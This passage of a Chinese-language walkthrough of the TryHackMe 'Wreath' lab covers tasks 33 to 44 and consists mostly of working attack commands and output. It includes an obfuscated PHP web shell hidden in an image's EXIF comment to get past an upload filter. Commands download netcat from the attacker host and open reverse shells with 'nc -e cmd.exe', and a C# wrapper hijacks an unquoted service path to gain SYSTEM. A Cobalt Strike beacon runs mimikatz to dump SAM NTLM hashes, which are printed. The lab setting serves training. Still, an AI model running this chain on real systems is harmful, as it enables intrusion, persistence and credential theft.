
在linux机器用socat做一个rev shell转发,这里注意转到本地的80端口，也就是上面http监听器的端口
```
[root@prod-serv tmp]# ./socat-max TCP4-LISTEN:15123,FORK  TCP4:10.50.102.104:80
```


上传到靶机执行
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload beacon.exe
Info: Uploading beacon.exe to C:\Users\Administrator\Documents\beacon.exe

                                                             
Data: 384340 bytes of 384340 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Administrator\Documents> .\beacon.exe
```


收到返回的beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333509026.jpg)






# Task 33  Personal PC Enumeration

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.101.100 -TopPorts 50


Hostname      : 10.200.101.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 5900, 993...}
finishTime    : 8/24/2022 9:58:37 AM

```


# Task 34  Personal PC Pivoting

CS开启pivot

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
[+] host called home, sent: 16 bytes
```

扫描
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# proxychains nmap -p 80,3389 -sV 10.200.101.100 -Pn -sT
...
Nmap scan report for 10.200.101.100
Host is up (4.3s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds

```

> Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language (including the version number) used on the website.

> PHP 7.4.11


# Task 35  Personal PC The Wonders of Git

重建项目
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# GitTools/Extractor/extractor.sh . Website
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...

```


查看提交
```
┌──(root💀kali)-[~/tryhackme/Wreath/Website]
└─# separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"


=======================================
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit


=======================================
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter


=======================================
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end


=======================================

```

# Task 36  Personal PC Website Code Analysis


唯一的php源码
```
┌──(root💀kali)-[~/tryhackme/Wreath/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3]
└─# cat ./resources/index.php                    

<?php

        if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                $target = "uploads/".basename($_FILES["file"]["name"]);
                $goodExts = ["jpg", "jpeg", "png", "gif"];
                if(file_exists($target)){
                        header("location: ./?msg=Exists");
                        die();
                }
                $size = getimagesize($_FILES["file"]["tmp_name"]);
                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
                        header("location: ./?msg=Fail");
                        die();
                }
                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
                header("location: ./?msg=Success");
                die();
        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
                header("location: ./?msg=Method");
        }


        if(isset($_GET["msg"])){
                $msg = $_GET["msg"];
                switch ($msg) {
                        case "Success":
                                $res = "File uploaded successfully!";
                                break;
                        case "Fail":
                                $res = "Invalid File Type";
                                break;
                        case "Exists":
                                $res = "File already exists";
                                break;
                        case "Method":
                                $res = "No file send";
                                break;

                }
        }
?>
<!DOCTYPE html>
<html lang=en>
        <!-- ToDo:
                  - Finish the styling: it looks awful
                  - Get Ruby more food. Greedy animal is going through it too fast
                  - Upgrade the filter on this page. Can't rely on basic auth for everything
                  - Phone Mrs Walker about the neighbourhood watch meetings
        -->
        <head>
                <title>Ruby Pictures</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
                <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
        </head>
        <body>
                <main>
                        <h1>Welcome Thomas!</h1>
                        <h2>Ruby Image Upload Page</h2>
                        <form method="post" enctype="multipart/form-data">
                                <input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
                                <input type="submit" name="upload" id="fileSubmit" value="Upload">
                        </form>
                        <p id=res><?php if (isset($res)){ echo $res; };?></p>
                </main>
        </body>
</html>

```

> What does Thomas have to phone Mrs Walker about?

> neighbourhood watch meetings

> Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?

> basic auth

> Which extensions are accepted (comma separated, no spaces or quotes)?

> jpg,jpeg,png,gift

# Task 37  Personal PC Exploit PoC

使用exiftool把php代码写进图片注释

```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# exiftool test-max.jpeg.php 
ExifTool Version Number         : 12.39
File Name                       : test-max.jpeg.php
Directory                       : .
File Size                       : 49 KiB
File Modification Date/Time     : 2022:08:25 01:57:37-04:00
File Access Date/Time           : 2022:08:25 01:57:37-04:00
File Inode Change Date/Time     : 2022:08:25 01:57:37-04:00
File Permissions                : -rw-------
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1646
Image Height                    : 254
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Image Size                      : 1646x254
Megapixels                      : 0.418
                                                                                                                                                                                                                                            

┌──(root💀kali)-[~/tryhackme/Wreath]
└─# exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-max.jpeg.php
    1 image files updated
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# exiftool test-max.jpeg.php                                                             
ExifTool Version Number         : 12.39
File Name                       : test-max.jpeg.php
Directory                       : .
File Size                       : 49 KiB
File Modification Date/Time     : 2022:08:25 01:58:59-04:00
File Access Date/Time           : 2022:08:25 01:58:59-04:00
File Inode Change Date/Time     : 2022:08:25 01:58:59-04:00
File Permissions                : -rw-------
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1646
Image Height                    : 254
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
Image Size                      : 1646x254
Megapixels                      : 0.418

```

上传以后访问：

1661407413964.jpg

# Task 38  AV Evasion Introduction

> Which category of evasion covers uploading a file to the storage on the target before executing it?

> On-Disk evasion

> What does AMSI stand for?

> Anti-Malware Scan Interface

> Which category of evasion does AMSI affect?

> In-Memory evasion

# Task 39  AV Evasion AV Detection Methods

> What other name can be used for Dynamic/Heuristic detection methods?

> Behavioural

> If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?

> static 

> When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?

> Pre-defined rules

> What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?

> Password

# Task 40  AV Evasion PHP Payload Obfuscation

源代码：
```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

去到[这个网站](https://www.gaijin.at/en/tools/php-obfuscator)混淆代码

得到
```
<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
```

对$符号进行转义
```
<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
```


写入注释
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" test-max.jpeg.php                                            130 ⨯
    1 image files updated

```

> What is the Host Name of the target?

> WREATH-PC

> What is our current username (include the domain in this)?

> wreath-pc\thomas

# Task 41  AV Evasion Compiling Netcat & Reverse Shell!

> What output do you get when running the command: certutil.exe?

> CertUtil: -dump command completed successfully.


分别在web shell上执行命令
```
curl http://10.50.102.104:8000/nc64.exe -o c:\\windows\\temp\\nc-max.exe

powershell.exe c:\\windows\\temp\\nc-max.exe 10.50.102.104 443 -e cmd.exe
```


收到nc的rev shell
```
──(root💀kali)-[~/tryhackme/Wreath]
└─# nc -lnvp 443                          
listening on [any] 443 ...
connect to [10.50.102.104] from (UNKNOWN) [10.200.101.100] 51276
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>whoami
whoami
wreath-pc\thomas

```

# Task 42  AV Evasion Enumeration

未加双引号的路径服务：SystemExplorerHelpService
```
S C:\xampp\htdocs\resources\uploads> sc.exe qc SystemExplorerHelpService
sc.exe qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

PS C:\xampp\htdocs\resources\uploads> powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


```

检查文件夹权限
```
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)




```


>  One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?

> SeImpersonatePrivilege

> What is the Name (second column from the left) of this service?

> SystemExplorerHelpService

# Task 43  AV Evasion Privilege Escalation


准备一份C#代码:Wrapper.cs
```
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-max.exe", "10.50.102.104 443 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
        }
    }
}
```


kali上编译上面的c#代码
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# mcs Wrapper.cs

```


拷贝到靶机,并移动到目标服务路径
```
PS C:\xampp\htdocs\resources\uploads> copy \\10.50.102.104\share\Wrapper.exe
copy \\10.50.102.104\share\Wrapper.exe


PS C:\xampp\htdocs\resources\uploads> copy Wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"
copy Wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"

PS C:\xampp\htdocs\resources\uploads> dir "C:\Program Files (x86)\System Explorer\"
dir "C:\Program Files (x86)\System Explorer\"


    Directory: C:\Program Files (x86)\System Explorer


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       21/12/2020     23:55                System Explorer                                                       
-a----       25/08/2022     09:15           3584 System.exe   
```

重启靶机，触发服务
```
PS C:\xampp\htdocs\resources\uploads> sc.exe stop SystemExplorerHelpService
sc.exe stop SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388

PS C:\xampp\htdocs\resources\uploads> sc.exe start SystemExplorerHelpService
sc.exe start SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1768
        FLAGS              : 

```


收到system shell
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# nc -lnvp 443                                                                                           130 ⨯
listening on [any] 443 ...
connect to [10.50.102.104] from (UNKNOWN) [10.200.101.100] 51593
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```


# Task 44  Exfiltration Exfiltration Techniques & Post Exploitation

反弹一个CS的beacon，dump出哈希

```
beacon> mimikatz lsadump::sam
[*] Tasked beacon to run mimikatz's lsadump::sam command
[+] host called home, sent: 750702 bytes
[+] received output:
Domain : WREATH-PC
SysKey : fce6f31c003e4157e8cb1bc59f4720e6
Local SID : S-1-5-21-3963238053-2357614183-4023578609

SAMKey : 2cd4ce2e61c42d1ee27e0bd1de2bf11b

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a05c3c807ceeb48c47252568da284cd2

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0a694ecc8e6294041abed05d4c9e5cb2

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-OG0LO2IQ9I7Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f1612b31cfe080b4d0e0bcff5a3049ae7f2640319157d1ee3a1ee6544885c732
      aes128_hmac       (4096) : 50a8ad0913485e14756ed79b531d046b
      des_cbc_md5       (4096) : ba4fd00e377a91f2

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-OG0LO2IQ9I7Administrator
    Credentials
      des_cbc_md5       : ba4fd00e377a91f2


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 06e57bdd6824566d79f127fa0de844e2

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : fe693b3a96c19410ed730bce6583f109

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 434ccdbaad5bf1066e9e56eac86ddea99db2520cbcbecc35678d9bc608d83e6c
      aes128_hmac       (4096) : e1830b8eb1fd5a27092271b0bfb35e75
      des_cbc_md5       (4096) : e380376e83e3d508

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : e380376e83e3d508


RID  : 000003e8 (1000)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 2298a010653c1b09328fbb2c095fa48f

* Primary:Kerberos-Newer-Keys *
    Default Salt : WREATH-PCThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 040ebd93c718ce8265ced3af665f1193a0d0b8d5bf3dc6b89e283b0c3d8917ac
      aes128_hmac       (4096) : 7fa029a3fcaef80fb9161e0ffa095240
      des_cbc_md5       (4096) : 51e651458345375e
    OldCredentials
      aes256_hmac       (4096) : 6011a2cdbc6cd6d63797a98a0921b5dce5b36a1bd21e42bea9fad15cce7a49ff
      aes128_hmac       (4096) : 1e3bce4f5bd2c84b455895d59189c4ff
      des_cbc_md5       (4096) : 9e644f8a8c437301
    OlderCredentials
      aes256_hmac       (4096) : 1332e489a1b4f1d431968a4de3efefeb092fdb1ceb4b2b99c8f5308f3bab1558
      aes128_hmac       (4096) : 02244721e90ff7b9e3c6fd1a0c0db391
      des_cbc_md5       (4096) : b99be0a15402b62f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WREATH-PCThomas
    Credentials
      des_cbc_md5       : 51e651458345375e
    OldCredentials
      des_cbc_md5       : 9e644f8a8c437301
```

> Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?

> nay

> For what reason is HTTPS preferred over HTTP during exfiltration?

> encryption

> What is the Administrator NT hash for this target?

> a05c3c807ceeb48c47252568da284cd2


